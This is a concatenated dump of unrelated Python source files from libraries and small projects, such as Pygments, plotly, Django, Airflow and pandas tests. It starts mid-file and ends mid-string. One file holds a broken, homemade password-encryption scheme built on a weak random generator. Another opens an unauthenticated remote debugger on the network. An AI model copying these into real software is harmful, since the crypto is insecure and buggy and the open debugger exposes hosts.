
class TestMoments:
    pass"
JY28	JY28-trac.py	"""""""
    pygments.styles.trac
    ~~~~~~~~~~~~~~~~~~~~

    Port of the default trac highlighter design.

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.style import Style
from pygments.token import Keyword, Name, Comment, String, Error, \
     Number, Operator, Generic, Whitespace


class TracStyle(Style):
    """"""
    Port of the default trac highlighter design.
    """"""

    styles = {
        Whitespace:             '#bbbbbb',
        Comment:                'italic #999988',
        Comment.Preproc:        'bold noitalic #999999',
        Comment.Special:        'bold #999999',

        Operator:               'bold',

        String:                 '#bb8844',
        String.Regex:           '#808000',

        Number:                 '#009999',

        Keyword:                'bold',
        Keyword.Type:           '#445588',

        Name.Builtin:           '#999999',
        Name.Function:          'bold #990000',
        Name.Class:             'bold #445588',
        Name.Exception:         'bold #990000',
        Name.Namespace:         '#555555',
        Name.Variable:          '#008080',
        Name.Constant:          '#008080',
        Name.Tag:               '#000080',
        Name.Attribute:         '#008080',
        Name.Entity:            '#800080',

        Generic.Heading:        '#999999',
        Generic.Subheading:     '#aaaaaa',
        Generic.Deleted:        'bg:#ffdddd #000000',
        Generic.Inserted:       'bg:#ddffdd #000000',
        Generic.Error:          '#aa0000',
        Generic.Emph:           'italic',
        Generic.Strong:         'bold',
        Generic.Prompt:         '#555555',
        Generic.Output:         '#888888',
        Generic.Traceback:      '#aa0000',

        Error:                  'bg:#e3d2d2 #a61717'
    }"
JD171	JD171-Favicon_pb2.py	"# -*- coding: utf-8 -*-
# Generated by the protocol buffer compiler.  DO NOT EDIT!
# source: streamlit/proto/Favicon.proto

from google.protobuf import descriptor as _descriptor
from google.protobuf import message as _message
from google.protobuf import reflection as _reflection
from google.protobuf import symbol_database as _symbol_database
# @@protoc_insertion_point(imports)

_sym_db = _symbol_database.Default()




DESCRIPTOR = _descriptor.FileDescriptor(
  name='streamlit/proto/Favicon.proto',
  package='',
  syntax='proto3',
  serialized_options=None,
  create_key=_descriptor._internal_create_key,
  serialized_pb=b'\n\x1dstreamlit/proto/Favicon.proto\""\x16\n\x07\x46\x61vicon\x12\x0b\n\x03url\x18\x01 \x01(\tb\x06proto3'
)




_FAVICON = _descriptor.Descriptor(
  name='Favicon',
  full_name='Favicon',
  filename=None,
  file=DESCRIPTOR,
  containing_type=None,
  create_key=_descriptor._internal_create_key,
  fields=[
    _descriptor.FieldDescriptor(
      name='url', full_name='Favicon.url', index=0,
      number=1, type=9, cpp_type=9, label=1,
      has_default_value=False, default_value=b"""".decode('utf-8'),
      message_type=None, enum_type=None, containing_type=None,
      is_extension=False, extension_scope=None,
      serialized_options=None, file=DESCRIPTOR,  create_key=_descriptor._internal_create_key),
  ],
  extensions=[
  ],
  nested_types=[],
  enum_types=[
  ],
  serialized_options=None,
  is_extendable=False,
  syntax='proto3',
  extension_ranges=[],
  oneofs=[
  ],
  serialized_start=33,
  serialized_end=55,
)

DESCRIPTOR.message_types_by_name['Favicon'] = _FAVICON
_sym_db.RegisterFileDescriptor(DESCRIPTOR)

Favicon = _reflection.GeneratedProtocolMessageType('Favicon', (_message.Message,), {
  'DESCRIPTOR' : _FAVICON,
  '__module__' : 'streamlit.proto.Favicon_pb2'
  # @@protoc_insertion_point(class_scope:Favicon)
  })
_sym_db.RegisterMessage(Favicon)


# @@protoc_insertion_point(module_scope)"
JY323	JY323-ft_utils.py	"import glob
import logging
import socket

import debugpy
import pandas as pd
from rdkit import Chem

logger = logging.getLogger(__name__)
logger.addHandler(logging.NullHandler())


def getipaddress():
    return socket.gethostbyname(socket.getfqdn())


def debug():
    logger.info(""Waiting for debugger to connect"")
    if (
        socket.getfqdn().startswith(""dcc"")
        or socket.getfqdn().startswith(""mol"")
        or socket.getfqdn().startswith(""ccc"")
    ):
        debugpy.listen(address=(getipaddress(), 3000))
        debugpy.wait_for_client()
    debugpy.breakpoint()


class ListDataset:
    def __init__(self, seqs):
        self.seqs = seqs

    def __getitem__(self, index):
        return self.seqs[index]

    def __len__(self):
        return len(self.seqs)


def transform_single_embedding_to_multiple(smiles_z_map):
    """"""Transforms an embedding map of the format smi->embedding to
    smi-> {""canonical_embeddings"":embedding}. This function exists
    as a compatibility layer

    Args:
        smiles_z_map ([type]): [description]
    """"""
    retval = dict()
    for key in smiles_z_map:
        retval[key] = {""canonical_embeddings"": smiles_z_map[key]}
    return retval


def normalize_smiles(smi, canonical, isomeric):
    normalized = Chem.MolToSmiles(
        Chem.MolFromSmiles(smi), canonical=canonical, isomericSmiles=isomeric
    )
    return normalized


def get_all_proteins(affinity_dir: str):
    files = glob.glob(affinity_dir + ""/*.csv"")
    all_proteins = []
    logger.info(files)
    for file in files:
        df = pd.read_csv(file)
        all_proteins.extend(df[""protein""].tolist())
    return set(all_proteins)


def append_to_file(filename, line):
    with open(filename, ""a"") as f:
        f.write(line + ""\n"")


def write_to_file(filename, line):
    with open(filename, ""w"") as f:
        f.write(line + ""\n"")"
JY185	JY185-_dup.py	"# Copyright 2009-2022 Joshua Bronson. All rights reserved.
#
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.


""""""Provide :class:`OnDup` and related functionality.""""""


from enum import Enum
import typing as t


class OD(Enum):
    """"""An action to take to prevent duplication from occurring.""""""

    #: Raise a :class:`~bidict.DuplicationError`.
    RAISE = 'RAISE'
    #: Overwrite existing items with new items.
    DROP_OLD = 'DROP_OLD'
    #: Keep existing items and drop new items.
    DROP_NEW = 'DROP_NEW'

    def __repr__(self) -> str:
        return f'{self.__class__.__name__}.{self.name}'


RAISE = OD.RAISE
DROP_OLD = OD.DROP_OLD
DROP_NEW = OD.DROP_NEW


class OnDup(t.NamedTuple('_OnDup', [('key', OD), ('val', OD), ('kv', OD)])):
    r""""""A 3-tuple of :class:`OD`\s specifying how to handle the 3 kinds of duplication.

    *See also* :ref:`basic-usage:Values Must Be Unique`
    (https://bidict.rtfd.io/basic-usage.html#values-must-be-unique)

    If *kv* is not specified, *val* will be used for *kv*.
    """"""

    __slots__ = ()

    def __new__(cls, key: OD = DROP_OLD, val: OD = RAISE, kv: t.Optional[OD] = None) -> 'OnDup':
        """"""Override to provide user-friendly default values.""""""
        return super().__new__(cls, key, val, kv or val)


#: Default :class:`OnDup` used for the
#: :meth:`~bidict.bidict.__init__`,
#: :meth:`~bidict.bidict.__setitem__`, and
#: :meth:`~bidict.bidict.update` methods.
ON_DUP_DEFAULT = OnDup(key=DROP_OLD, val=RAISE, kv=RAISE)
#: An :class:`OnDup` whose members are all :obj:`RAISE`.
ON_DUP_RAISE = OnDup(key=RAISE, val=RAISE, kv=RAISE)
#: An :class:`OnDup` whose members are all :obj:`DROP_OLD`.
ON_DUP_DROP_OLD = OnDup(key=DROP_OLD, val=DROP_OLD, kv=DROP_OLD)"
JD310	JD310-translate_v3_create_glossary.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#    http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# [START translate_v3_create_glossary]
from google.cloud import translate_v3 as translate


def create_glossary(
    project_id=""YOUR_PROJECT_ID"",
    input_uri=""YOUR_INPUT_URI"",
    glossary_id=""YOUR_GLOSSARY_ID"",
    timeout=180,
):
    """"""
    Create a equivalent term sets glossary. Glossary can be words or
    short phrases (usually fewer than five words).
    https://cloud.google.com/translate/docs/advanced/glossary#format-glossary
    """"""
    client = translate.TranslationServiceClient()

    # Supported language codes: https://cloud.google.com/translate/docs/languages
    source_lang_code = ""en""
    target_lang_code = ""ja""
    location = ""us-central1""  # The location of the glossary

    name = client.glossary_path(project_id, location, glossary_id)
    language_codes_set = translate.types.Glossary.LanguageCodesSet(
        language_codes=[source_lang_code, target_lang_code]
    )

    gcs_source = translate.types.GcsSource(input_uri=input_uri)

    input_config = translate.types.GlossaryInputConfig(gcs_source=gcs_source)

    glossary = translate.types.Glossary(
        name=name, language_codes_set=language_codes_set, input_config=input_config
    )

    parent = f""projects/{project_id}/locations/{location}""
    # glossary is a custom dictionary Translation API uses
    # to translate the domain-specific terminology.
    operation = client.create_glossary(parent=parent, glossary=glossary)

    result = operation.result(timeout)
    print(""Created: {}"".format(result.name))
    print(""Input Uri: {}"".format(result.input_config.gcs_source.input_uri))


# [END translate_v3_create_glossary]"
JY351	JY351-urls.py	"""""""eCommerce URL Configuration

The `urlpatterns` list routes URLs to views. For more information please see:
    https://docs.djangoproject.com/en/4.1/topics/http/urls/
Examples:
Function views
    1. Add an import:  from my_app import views
    2. Add a URL to urlpatterns:  path('', views.home, name='home')
Class-based views
    1. Add an import:  from other_app.views import Home
    2. Add a URL to urlpatterns:  path('', Home.as_view(), name='home')
Including another URLconf
    1. Import the include() function: from django.urls import include, path
    2. Add a URL to urlpatterns:  path('blog/', include('blog.urls'))
""""""
from django.contrib import admin
from django.urls import path,include
from crud import views

from django.conf import settings
from django.conf.urls.static import static

urlpatterns = [
    path('ckeditor/',include('ckeditor_uploader.urls')),
    path('admin/', admin.site.urls),
    path('',views.homepage,name=""homepage""),
    path('home/',views.homepage,name=""homepage""),
    path('about/',views.about,name=""about""),
    path('contact/',views.contact,name=""contact""),
    path('product/',views.product,name=""product""),
    path('signup/',views.user_signup,name=""user_signup""),
    path('signin/',views.user_login,name=""user_login""),
    path('dashboard/',views.dashboard,name=""dashboard""),
    path('cart/',views.cart,name=""cart""),
    path('addpost/',views.addpost,name=""addpost""),
    path('addcart/<str:title>',views.addcart,name=""addcart""),
    path('updatepost/<int:id>',views.updatepost,name=""updatepost""),
    path('deletepost/<int:id>',views.deletepost,name=""deletepost""),
    path('logout/',views.user_logout,name=""logout""),
    path('oauth/', include('social_django.urls', namespace='social')),
]

if settings.DEBUG:
    urlpatterns += static(settings.MEDIA_URL,document_root=settings.MEDIA_ROOT)"
JD470	JD470-acceso.py	"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
import math
class Contra:
    def __init__(self, login, contrasenia):
        # Valores para el generador congruencial
        self.parametro_a = 269
        self.modulo = 2 ** 31
        # Identificacion del usuario login
        self.login = login
        # Identificacion del usuario
        self.password = contrasenia

    @staticmethod
    def cambiardigitos(digitos):
        decimales = [10, 11, 12, 13, 14, 15]
        hexadecimal = ['A', 'B', 'C', 'D', 'E', 'F']
        for c in range(7):
            if digitos == decimales[c-1]:
                digitos = hexadecimal[c-1]
        return digitos
    def decimalhexadecimal(self, decimal):
        hexadecimal = ''
        while decimal != 0:
            rem = self.cambiardigitos(decimal % 16)
            hexadecimal = str(rem) + hexadecimal
            decimal = int(decimal / 16)
        return hexadecimal
    def semilla(self):
        datos_acceso = self.login.split('0')
        usuario = datos_acceso[0]
        suma = 0
        for caracter in usuario:
            if caracter not in ('a','e','i','o','u'):
                suma += ord (caracter)
        return suma

    def generar(self):
        aleatorio=[self.semilla()]
        for i in range(len(self.password)+ 1):
            temp = (self.parametro_a * aleatorio[i-1]) % self.modulo
            aleatorio.append(temp)
        aleatorio.pop(0)
        aleatorios = [valor / self.modulo for valor in aleatorio]
        return aleatorios
    def encriptar(self):
        # Donde estará la contrasenia
        palabra = ''
        valores_aleatorios = self.generar()
        contrasenia = self.password
        #se multiplica los valores aleatorio por los valores ASCII de cada letra
        for i in range(len(self.contrasenia)):
            caracter_en_ascii = self.contrasenia(i)
            termino = self.decimalhexadecimal(math.floor(caracter_en_ascii * valores_aleatorios[i]))
            palabra += termino
        return palabra"
JY363	JY363-_cumulative.py	"import _plotly_utils.basevalidators


class CumulativeValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""cumulative"", parent_name=""histogram"", **kwargs):
        super(CumulativeValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Cumulative""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            currentbin
                Only applies if cumulative is enabled. Sets
                whether the current bin is included, excluded,
                or has half of its value included in the
                current cumulative value. ""include"" is the
                default for compatibility with various other
                tools, however it introduces a half-bin bias to
                the results. ""exclude"" makes the opposite half-
                bin bias, and ""half"" removes it.
            direction
                Only applies if cumulative is enabled. If
                ""increasing"" (default) we sum all prior bins,
                so the result increases from left to right. If
                ""decreasing"" we sum later bins so the result
                decreases from left to right.
            enabled
                If true, display the cumulative distribution by
                summing the binned values. Use the `direction`
                and `centralbin` attributes to tune the
                accumulation method. Note: in this mode, the
                ""density"" `histnorm` settings behave the same
                as their equivalents without ""density"": """" and
                ""density"" both rise to the number of data
                points, and ""probability"" and *probability
                density* both rise to the number of sample
                points.
"""""",
            ),
            **kwargs,
        )"
JD270	JD270-models.py	"""""""
 The GeometryColumns and SpatialRefSys models for the PostGIS backend.
""""""
from django.contrib.gis.db.backends.base.models import SpatialRefSysMixin
from django.db import models


class PostGISGeometryColumns(models.Model):
    """"""
    The 'geometry_columns' view from PostGIS. See the PostGIS
    documentation at Ch. 4.3.2.
    """"""

    f_table_catalog = models.CharField(max_length=256)
    f_table_schema = models.CharField(max_length=256)
    f_table_name = models.CharField(max_length=256)
    f_geometry_column = models.CharField(max_length=256)
    coord_dimension = models.IntegerField()
    srid = models.IntegerField(primary_key=True)
    type = models.CharField(max_length=30)

    class Meta:
        app_label = ""gis""
        db_table = ""geometry_columns""
        managed = False

    def __str__(self):
        return ""%s.%s - %dD %s field (SRID: %d)"" % (
            self.f_table_name,
            self.f_geometry_column,
            self.coord_dimension,
            self.type,
            self.srid,
        )

    @classmethod
    def table_name_col(cls):
        """"""
        Return the name of the metadata column used to store the feature table
        name.
        """"""
        return ""f_table_name""

    @classmethod
    def geom_col_name(cls):
        """"""
        Return the name of the metadata column used to store the feature
        geometry column.
        """"""
        return ""f_geometry_column""


class PostGISSpatialRefSys(models.Model, SpatialRefSysMixin):
    """"""
    The 'spatial_ref_sys' table from PostGIS. See the PostGIS
    documentation at Ch. 4.2.1.
    """"""

    srid = models.IntegerField(primary_key=True)
    auth_name = models.CharField(max_length=256)
    auth_srid = models.IntegerField()
    srtext = models.CharField(max_length=2048)
    proj4text = models.CharField(max_length=2048)

    class Meta:
        app_label = ""gis""
        db_table = ""spatial_ref_sys""
        managed = False

    @property
    def wkt(self):
        return self.srtext"
JY347	JY347-__init__.py	"import sys
from typing import TYPE_CHECKING

if sys.version_info < (3, 7) or TYPE_CHECKING:
    from ._visible import VisibleValidator
    from ._type import TypeValidator
    from ._templateitemname import TemplateitemnameValidator
    from ._symbol import SymbolValidator
    from ._sourcetype import SourcetypeValidator
    from ._sourcelayer import SourcelayerValidator
    from ._sourceattribution import SourceattributionValidator
    from ._source import SourceValidator
    from ._opacity import OpacityValidator
    from ._name import NameValidator
    from ._minzoom import MinzoomValidator
    from ._maxzoom import MaxzoomValidator
    from ._line import LineValidator
    from ._fill import FillValidator
    from ._coordinates import CoordinatesValidator
    from ._color import ColorValidator
    from ._circle import CircleValidator
    from ._below import BelowValidator
else:
    from _plotly_utils.importers import relative_import

    __all__, __getattr__, __dir__ = relative_import(
        __name__,
        [],
        [
            ""._visible.VisibleValidator"",
            ""._type.TypeValidator"",
            ""._templateitemname.TemplateitemnameValidator"",
            ""._symbol.SymbolValidator"",
            ""._sourcetype.SourcetypeValidator"",
            ""._sourcelayer.SourcelayerValidator"",
            ""._sourceattribution.SourceattributionValidator"",
            ""._source.SourceValidator"",
            ""._opacity.OpacityValidator"",
            ""._name.NameValidator"",
            ""._minzoom.MinzoomValidator"",
            ""._maxzoom.MaxzoomValidator"",
            ""._line.LineValidator"",
            ""._fill.FillValidator"",
            ""._coordinates.CoordinatesValidator"",
            ""._color.ColorValidator"",
            ""._circle.CircleValidator"",
            ""._below.BelowValidator"",
        ],
    )"
JD392	JD392-noxfile_config.py	"# Copyright 2020 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# Default TEST_CONFIG_OVERRIDE for python repos.

# You can copy this file into your directory, then it will be imported from
# the noxfile.py.

# The source of truth:
# https://github.com/GoogleCloudPlatform/python-docs-samples/blob/main/noxfile_config.py

TEST_CONFIG_OVERRIDE = {
    # You can opt out from the test for specific Python versions.
    'ignored_versions': [""2.7""],

    # Declare optional test sessions you want to opt-in. Currently we
    # have the following optional test sessions:
    #     'cloud_run' # Test session for Cloud Run application.
    'opt_in_sessions': [],

    # An envvar key for determining the project id to use. Change it
    # to 'BUILD_SPECIFIC_GCLOUD_PROJECT' if you want to opt in using a
    # build specific Cloud project. You can also use your own string
    # to use your own Cloud project.
    'gcloud_project_env': 'GOOGLE_CLOUD_PROJECT',
    # 'gcloud_project_env': 'BUILD_SPECIFIC_GCLOUD_PROJECT',

    # A dictionary you want to inject into your test. Don't put any
    # secrets here. These values will override predefined values.
    'envs': {
        ""TO_LANG"": ""en,ja"",
        ""TRANSLATE_TOPIC"": ""translate-topic"",
        ""RESULT_TOPIC"": ""result-topic"",
        ""RESULT_BUCKET"": ""result-bucket"",
    },
}"
JY19	JY19-graphviz.py	"""""""
    pygments.lexers.graphviz
    ~~~~~~~~~~~~~~~~~~~~~~~~

    Lexer for the DOT language (graphviz).

    :copyright: Copyright 2006-2022 by the Pygments team, see AUTHORS.
    :license: BSD, see LICENSE for details.
""""""

from pygments.lexer import RegexLexer, bygroups
from pygments.token import Comment, Keyword, Operator, Name, String, Number, \
    Punctuation, Whitespace


__all__ = ['GraphvizLexer']


class GraphvizLexer(RegexLexer):
    """"""
    For graphviz DOT graph description language.

    .. versionadded:: 2.8
    """"""
    name = 'Graphviz'
    url = 'https://www.graphviz.org/doc/info/lang.html'
    aliases = ['graphviz', 'dot']
    filenames = ['*.gv', '*.dot']
    mimetypes = ['text/x-graphviz', 'text/vnd.graphviz']
    tokens = {
        'root': [
            (r'\s+', Whitespace),
            (r'(#|//).*?$', Comment.Single),
            (r'/(\\\n)?[*](.|\n)*?[*](\\\n)?/', Comment.Multiline),
            (r'(?i)(node|edge|graph|digraph|subgraph|strict)\b', Keyword),
            (r'--|->', Operator),
            (r'[{}[\]:;,]', Punctuation),
            (r'(\b\D\w*)(\s*)(=)(\s*)',
                bygroups(Name.Attribute, Whitespace, Punctuation, Whitespace),
                'attr_id'),
            (r'\b(n|ne|e|se|s|sw|w|nw|c|_)\b', Name.Builtin),
            (r'\b\D\w*', Name.Tag),  # node
            (r'[-]?((\.[0-9]+)|([0-9]+(\.[0-9]*)?))', Number),
            (r'""(\\""|[^""])*?""', Name.Tag),  # quoted node
            (r'<', Punctuation, 'xml'),
        ],
        'attr_id': [
            (r'\b\D\w*', String, '#pop'),
            (r'[-]?((\.[0-9]+)|([0-9]+(\.[0-9]*)?))', Number, '#pop'),
            (r'""(\\""|[^""])*?""', String.Double, '#pop'),
            (r'<', Punctuation, ('#pop', 'xml')),
        ],
        'xml': [
            (r'<', Punctuation, '#push'),
            (r'>', Punctuation, '#pop'),
            (r'\s+', Whitespace),
            (r'[^<>\s]', Name.Tag),
        ]
    }"
JY286	JY286-kinesis.py	"#
# Licensed to the Apache Software Foundation (ASF) under one
# or more contributor license agreements.  See the NOTICE file
# distributed with this work for additional information
# regarding copyright ownership.  The ASF licenses this file
# to you under the Apache License, Version 2.0 (the
# ""License""); you may not use this file except in compliance
# with the License.  You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing,
# software distributed under the License is distributed on an
# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
# KIND, either express or implied.  See the License for the
# specific language governing permissions and limitations
# under the License.
""""""This module contains AWS Firehose hook""""""
from __future__ import annotations

from typing import Iterable

from airflow.providers.amazon.aws.hooks.base_aws import AwsBaseHook


class FirehoseHook(AwsBaseHook):
    """"""
    Interact with Amazon Kinesis Firehose.
    Provide thick wrapper around :external+boto3:py:class:`boto3.client(""firehose"") <Firehose.Client>`.

    :param delivery_stream: Name of the delivery stream

    Additional arguments (such as ``aws_conn_id``) may be specified and
    are passed down to the underlying AwsBaseHook.

    .. seealso::
        - :class:`airflow.providers.amazon.aws.hooks.base_aws.AwsBaseHook`
    """"""

    def __init__(self, delivery_stream: str, *args, **kwargs) -> None:
        self.delivery_stream = delivery_stream
        kwargs[""client_type""] = ""firehose""
        super().__init__(*args, **kwargs)

    def put_records(self, records: Iterable):
        """"""Write batch records to Kinesis Firehose

        .. seealso::
            - :external+boto3:py:meth:`Firehose.Client.put_record_batch`

        :param records: list of records
        """"""
        return self.get_conn().put_record_batch(DeliveryStreamName=self.delivery_stream, Records=records)"
JY417	JY417-_hoverlabel.py	"import _plotly_utils.basevalidators


class HoverlabelValidator(_plotly_utils.basevalidators.CompoundValidator):
    def __init__(self, plotly_name=""hoverlabel"", parent_name=""barpolar"", **kwargs):
        super(HoverlabelValidator, self).__init__(
            plotly_name=plotly_name,
            parent_name=parent_name,
            data_class_str=kwargs.pop(""data_class_str"", ""Hoverlabel""),
            data_docs=kwargs.pop(
                ""data_docs"",
                """"""
            align
                Sets the horizontal alignment of the text
                content within hover label box. Has an effect
                only if the hover label text spans more two or
                more lines
            alignsrc
                Sets the source reference on Chart Studio Cloud
                for `align`.
            bgcolor
                Sets the background color of the hover labels
                for this trace
            bgcolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bgcolor`.
            bordercolor
                Sets the border color of the hover labels for
                this trace.
            bordercolorsrc
                Sets the source reference on Chart Studio Cloud
                for `bordercolor`.
            font
                Sets the font used in hover labels.
            namelength
                Sets the default length (in number of
                characters) of the trace name in the hover
                labels for all traces. -1 shows the whole name
                regardless of length. 0-3 shows the first 0-3
                characters, and an integer >3 will show the
                whole name if it is less than that many
                characters, but if it is longer, will truncate
                to `namelength - 3` characters and add an
                ellipsis.
            namelengthsrc
                Sets the source reference on Chart Studio Cloud
                for `namelength`.
"""""",
            ),
            **kwargs,
        )"
JY278	JY278-flock_tool.py	"#!/usr/bin/env python3
# Copyright (c) 2011 Google Inc. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.

""""""These functions are executed via gyp-flock-tool when using the Makefile
generator.  Used on systems that don't have a built-in flock.""""""

import fcntl
import os
import struct
import subprocess
import sys


def main(args):
    executor = FlockTool()
    executor.Dispatch(args)


class FlockTool:
    """"""This class emulates the 'flock' command.""""""

    def Dispatch(self, args):
        """"""Dispatches a string command to a method.""""""
        if len(args) < 1:
            raise Exception(""Not enough arguments"")

        method = ""Exec%s"" % self._CommandifyName(args[0])
        getattr(self, method)(*args[1:])

    def _CommandifyName(self, name_string):
        """"""Transforms a tool name like copy-info-plist to CopyInfoPlist""""""
        return name_string.title().replace(""-"", """")

    def ExecFlock(self, lockfile, *cmd_list):
        """"""Emulates the most basic behavior of Linux's flock(1).""""""
        # Rely on exception handling to report errors.
        # Note that the stock python on SunOS has a bug
        # where fcntl.flock(fd, LOCK_EX) always fails
        # with EBADF, that's why we use this F_SETLK
        # hack instead.
        fd = os.open(lockfile, os.O_WRONLY | os.O_NOCTTY | os.O_CREAT, 0o666)
        if sys.platform.startswith(""aix""):
            # Python on AIX is compiled with LARGEFILE support, which changes the
            # struct size.
            op = struct.pack(""hhIllqq"", fcntl.F_WRLCK, 0, 0, 0, 0, 0, 0)
        else:
            op = struct.pack(""hhllhhl"", fcntl.F_WRLCK, 0, 0, 0, 0, 0, 0)
        fcntl.fcntl(fd, fcntl.F_SETLK, op)
        return subprocess.call(cmd_list)


if __name__ == ""__main__"":
    sys.exit(main(sys.argv[1:]))"
JD504	JD504-test_parse_iso8601.py	"from datetime import datetime

import pytest

from pandas._libs import tslib


@pytest.mark.parametrize(
    ""date_str, exp"",
    [
        (""2011-01-02"", datetime(2011, 1, 2)),
        (""2011-1-2"", datetime(2011, 1, 2)),
        (""2011-01"", datetime(2011, 1, 1)),
        (""2011-1"", datetime(2011, 1, 1)),
        (""2011 01 02"", datetime(2011, 1, 2)),
        (""2011.01.02"", datetime(2011, 1, 2)),
        (""2011/01/02"", datetime(2011, 1, 2)),
        (""2011\\01\\02"", datetime(2011, 1, 2)),
        (""2013-01-01 05:30:00"", datetime(2013, 1, 1, 5, 30)),
        (""2013-1-1 5:30:00"", datetime(2013, 1, 1, 5, 30)),
    ],
)
def test_parsers_iso8601(date_str, exp):
    # see gh-12060
    #
    # Test only the ISO parser - flexibility to
    # different separators and leading zero's.
    actual = tslib._test_parse_iso8601(date_str)
    assert actual == exp


@pytest.mark.parametrize(
    ""date_str"",
    [
        ""2011-01/02"",
        ""2011=11=11"",
        ""201401"",
        ""201111"",
        ""200101"",
        # Mixed separated and unseparated.
        ""2005-0101"",
        ""200501-01"",
        ""20010101 12:3456"",
        ""20010101 1234:56"",
        # HHMMSS must have two digits in
        # each component if unseparated.
        ""20010101 1"",
        ""20010101 123"",
        ""20010101 12345"",
        ""20010101 12345Z"",
    ],
)
def test_parsers_iso8601_invalid(date_str):
    msg = f'Error parsing datetime string ""{date_str}""'

    with pytest.raises(ValueError, match=msg):
        tslib._test_parse_iso8601(date_str)


def test_parsers_iso8601_invalid_offset_invalid():
    date_str = ""2001-01-01 12-34-56""
    msg = f'Timezone hours offset out of range in datetime string ""{date_str}""'

    with pytest.raises(ValueError, match=msg):
        tslib._test_parse_iso8601(date_str)


def test_parsers_iso8601_leading_space():
    # GH#25895 make sure isoparser doesn't overflow with long input
    date_str, expected = (""2013-1-1 5:30:00"", datetime(2013, 1, 1, 5, 30))
    actual = tslib._test_parse_iso8601("" "" * 200 + date_str)
    assert actual == expected"
JY173	JY173-managers.py	"from django.conf import settings
from django.core import checks
from django.core.exceptions import FieldDoesNotExist
from django.db import models


class CurrentSiteManager(models.Manager):
    ""Use this to limit objects to those associated with the current site.""

    use_in_migrations = True

    def __init__(self, field_name=None):
        super().__init__()
        self.__field_name = field_name

    def check(self, **kwargs):
        errors = super().check(**kwargs)
        errors.extend(self._check_field_name())
        return errors

    def _check_field_name(self):
        field_name = self._get_field_name()
        try:
            field = self.model._meta.get_field(field_name)
        except FieldDoesNotExist:
            return [
                checks.Error(
                    ""CurrentSiteManager could not find a field named '%s'.""
                    % field_name,
                    obj=self,
                    id=""sites.E001"",
                )
            ]

        if not field.many_to_many and not isinstance(field, (models.ForeignKey)):
            return [
                checks.Error(
                    ""CurrentSiteManager cannot use '%s.%s' as it is not a foreign key ""
                    ""or a many-to-many field.""
                    % (self.model._meta.object_name, field_name),
                    obj=self,
                    id=""sites.E002"",
                )
            ]

        return []

    def _get_field_name(self):
        """"""Return self.__field_name or 'site' or 'sites'.""""""

        if not self.__field_name:
            try:
                self.model._meta.get_field(""site"")
            except FieldDoesNotExist:
                self.__field_name = ""sites""
            else:
                self.__field_name = ""site""
        return self.__field_name

    def get_queryset(self):
        return (
            super()
            .get_queryset()
            .filter(**{self._get_field_name() + ""__id"": settings.SITE_ID})
        )"
JD40	JD40-tornadoweb.py	"# Copyright 2017 Elisey Zanko
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
# http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import sys
import typing

from pip._vendor.tenacity import BaseRetrying
from pip._vendor.tenacity import DoAttempt
from pip._vendor.tenacity import DoSleep
from pip._vendor.tenacity import RetryCallState

from tornado import gen

if typing.TYPE_CHECKING:
    from tornado.concurrent import Future

_RetValT = typing.TypeVar(""_RetValT"")


class TornadoRetrying(BaseRetrying):
    def __init__(self, sleep: ""typing.Callable[[float], Future[None]]"" = gen.sleep, **kwargs: typing.Any) -> None:
        super().__init__(**kwargs)
        self.sleep = sleep

    @gen.coroutine
    def __call__(  # type: ignore  # Change signature from supertype
        self,
        fn: ""typing.Callable[..., typing.Union[typing.Generator[typing.Any, typing.Any, _RetValT], Future[_RetValT]]]"",
        *args: typing.Any,
        **kwargs: typing.Any,
    ) -> ""typing.Generator[typing.Any, typing.Any, _RetValT]"":
        self.begin()

        retry_state = RetryCallState(retry_object=self, fn=fn, args=args, kwargs=kwargs)
        while True:
            do = self.iter(retry_state=retry_state)
            if isinstance(do, DoAttempt):
                try:
                    result = yield fn(*args, **kwargs)
                except BaseException:  # noqa: B902
                    retry_state.set_exception(sys.exc_info())
                else:
                    retry_state.set_result(result)
            elif isinstance(do, DoSleep):
                retry_state.prepare_for_next_attempt()
                yield self.sleep(do)
            else:
                raise gen.Return(do)"
JY255	JY255-__init__.py	"from nonebot import on_command, on_keyword
from nonebot.rule import to_me
from nonebot.matcher import Matcher
from nonebot.adapters import Message
from nonebot.params import Arg, CommandArg, ArgPlainText
from nonebot.adapters.onebot.v11 import Bot, Event
from nonebot.typing import T_State  
import nonebot


king = on_command('天王', aliases={'king'}, rule=to_me())


@king.handle()
async def king_handle(bot: Bot, event: Event, state: T_State):

    session_id = event.get_session_id()
    user_id = str(event.get_user_id())

    msg = '''天王表格辅助网站: http://m.caizhy.cn/
蛋蝎队白嫖码： 
